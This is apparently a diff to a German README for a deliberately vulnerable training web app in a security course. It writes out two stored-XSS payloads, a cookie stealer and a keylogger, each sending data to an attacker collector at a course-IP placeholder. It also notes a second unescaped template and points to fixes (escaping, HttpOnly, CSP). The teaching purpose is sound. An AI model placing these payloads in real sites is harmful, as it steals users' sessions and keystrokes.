@@ -20,7 +20,7 @@ python collector.py      # Angreifer-Sammelstelle auf :5001 -> loot.log
 ## Szenario 1 — Cookie-Klau
 Als eingeloggter User einen Aushang mit diesem Inhalt posten:
 ```html
-<script>new Image().src="http://127.0.0.1:5001/steal?c="+encodeURIComponent(document.cookie)</script>
+<script>new Image().src="http://<DEINE-KURS-IP>:5001/steal?c="+encodeURIComponent(document.cookie)</script>
 ```
 Sobald ein anderer eingeloggter Reiter das Board öffnet, landet dessen Session-Cookie
 in `loot.log`. Mit dem Cookie kann der Angreifer die Session übernehmen
@@ -28,7 +28,7 @@ in `loot.log`. Mit dem Cookie kann der Angreifer die Session übernehmen
 
 ## Szenario 2 — Keylogger
 ```html
-<script>document.addEventListener('keydown',e=>{new Image().src="http://127.0.0.1:5001/keys?k="+encodeURIComponent(e.key)})</script>
+<script>document.addEventListener('keydown',e=>{new Image().src="http://<DEINE-KURS-IP>:5001/keys?k="+encodeURIComponent(e.key)})</script>
 ```
 Jeder Tastendruck der Opfer auf der Board-Seite wird an den Collector geschickt.
 
@@ -39,3 +39,9 @@ Der eigentliche Fehler ist, **Ausgabe** nicht zu escapen (nicht die Eingabe zu f
 ## Nächster Schritt
 **Ordner 11:** Fix — Auto-Escaping an (`|safe` weg), `HttpOnly`-Cookie, und eine
 **Content-Security-Policy**, die inline-Skripte blockt.
+
+## Zweiter, natürlicher XSS-Vektor: Pony-Beschreibungen
+Neben dem Anschlagbrett wird auch die **Pony-Beschreibung** auf der Detailseite
+(`/pony/<id>`) mit `|safe` gerendert (`templates/pony.html`). Ein Verkäufer mit
+manipuliertem Beschreibungstext (`<script>…</script>`) trifft jeden, der das Pony
+ansieht. In Ordner 11 ist auch diese Ausgabe wieder escaped.
